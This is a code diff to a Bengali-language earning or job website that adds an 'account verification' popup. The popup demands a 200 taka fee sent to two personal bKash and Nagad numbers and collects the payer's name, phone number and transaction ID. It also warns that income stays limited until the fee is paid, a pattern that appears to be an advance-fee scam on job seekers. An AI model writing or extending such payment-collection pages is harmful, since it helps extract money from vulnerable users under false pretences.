@@ -340,6 +340,60 @@ body {
   .job h3 {font-size: 13px;}
   .job p {font-size: 10px;}
 }
+  
+/* Verification Popup Design */
+#verifyModal {
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.75);
+  z-index: 9999;
+  display: none;
+  align-items: center;
+  justify-content: center;
+  padding: 15px;
+}
+
+.verify-box {
+  background: #ffffff;
+  color: #172033;
+  width: 100%;
+  max-width: 400px;
+  padding: 22px;
+  border-radius: 18px;
+  max-height: 90vh;
+  overflow-y: auto;
+  text-align: center;
+}
+
+.verify-box h2 {
+  color: #123b80;
+}
+
+.verify-box h1 {
+  color: #16a34a;
+  font-size: 32px;
+}
+
+.verify-box input {
+  width: 100%;
+  padding: 13px;
+  margin: 8px 0;
+  border: 1px solid #ccc;
+  border-radius: 9px;
+  box-sizing: border-box;
+  font-size: 15px;
+}
+
+.verify-box button {
+  padding: 12px 18px;
+  border: none;
+  border-radius: 9px;
+  background: #16a34a;
+  color: white;
+  font-weight: bold;
+  cursor: pointer;
+}
+  
 </style>
 </head>
 
@@ -388,7 +442,7 @@ body {
 
   <!-- Verification -->
 
-  <div class="verify" onclick="go('verification.html')">
+  <div class="verify" onclick="openVerifyModal()">
 
     <div>
       <h2>আপনার একাউন্ট</h2>
@@ -396,7 +450,7 @@ body {
       <p>ভেরিফাই না করলে ইনকাম সীমিত থাকবে!</p>
     </div>
 
-    <button onclick="event.stopPropagation();go('verification.html')">
+    <button onclick="event.stopPropagation();openVerifyModal()">
       এখনই ভেরিফাই করুন
     </button>
 
@@ -518,11 +572,57 @@ body {
 
 <div class="toast" id="toast"></div>
 
-<script type="module">
+
+<!-- Verification Payment Popup -->
+<div id="verifyModal" style="display:none;">
+  <div class="verify-box">
+    <button onclick="closeVerifyModal()">✕</button>
+
+    <h2>অ্যাকাউন্ট ভেরিফিকেশন</h2>
+    <h1>২০০ টাকা</h1>
+    <p>ভেরিফিকেশন ফি</p>
+
+    <p>বিকাশ (Personal): 01837976455</p>
+    <p>নগদ (Personal): 01404534868</p>
+
+    <form onsubmit="submitVerification(event)">
+      <input id="verifyName" type="text"
+        placeholder="আপনার নাম" required>
+
+      <input id="verifyPhone" type="tel"
+        placeholder="যে নম্বর থেকে টাকা পাঠিয়েছেন"
+        required>
+
+      <input id="verifyTrx" type="text"
+        placeholder="ট্রানজেকশন আইডি" required>
+
+      <div style="background:#ffe5e5;padding:12px;">
+        ⚠️ সতর্কতা:
+        ভুলবশত ফ্লেক্সিলোড করলে টাকা ফেরতযোগ্য নয়।
+        অবশ্যই Send Money করতে হবে।
+        নম্বরগুলো Personal নম্বর।
+      </div>
+
+      <button type="submit">সাবমিট করুন</button>
+    </form>
+  </div>
+</div>
+  
+  <script type="module">
   
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 import { getAuth } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
-import { getFirestore, doc, getDoc, updateDoc, setDoc, increment } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+import {
+  getFirestore,
+  doc,
+  getDoc,
+  updateDoc,
+  setDoc,
+  increment,
+  addDoc,
+  collection,
+  serverTimestamp
+} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 const firebaseConfig = {
   apiKey: "AIzaSyArqUadtFApeblIJGaU5aPHASkcvrKNTJc",
   authDomain: "bd-job-85768.firebaseapp.com",
@@ -559,7 +659,17 @@ function toggleMenu() {
   menu.style.display =
     menu.style.display === 'block' ? 'none' : 'block';
 }
+// Verification Popup
+function openVerifyModal() {
+  document.getElementById('verifyModal').style.display = 'flex';
+}
 
+function closeVerifyModal() {
+  document.getElementById('verifyModal').style.display = 'none';
+}
+
+window.openVerifyModal = openVerifyModal;
+window.closeVerifyModal = closeVerifyModal;
 // Notification
 
 function notifyUser() {
